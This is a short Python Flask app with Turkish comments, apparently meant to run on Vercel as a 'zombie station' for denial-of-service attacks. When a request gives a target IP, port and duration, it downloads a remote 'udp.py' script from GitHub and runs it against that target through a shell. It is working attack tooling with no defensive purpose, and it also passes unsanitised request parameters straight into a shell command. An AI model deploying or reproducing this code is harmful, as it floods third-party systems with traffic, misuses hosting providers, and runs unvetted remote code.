from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/')
def home():
    target = request.args.get('ip')
    port = request.args.get('port', '80')
    duration = request.args.get('time', '10')

    if target:
        # Vercel'in Washington (iad1) mermisi
        cmd = f"curl -s -L -o /tmp/udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py && python3 /tmp/udp.py {target} {port} 100 {duration}"
        subprocess.Popen(cmd, shell=True)
        return f"🚀 Washington (iad1) Ateslendi: {target}", 200
    
    return "✅ Zombi istasyonu hazır, ama IP girmedin kanka.", 200

# Vercel'in giriş kapısı
app = app
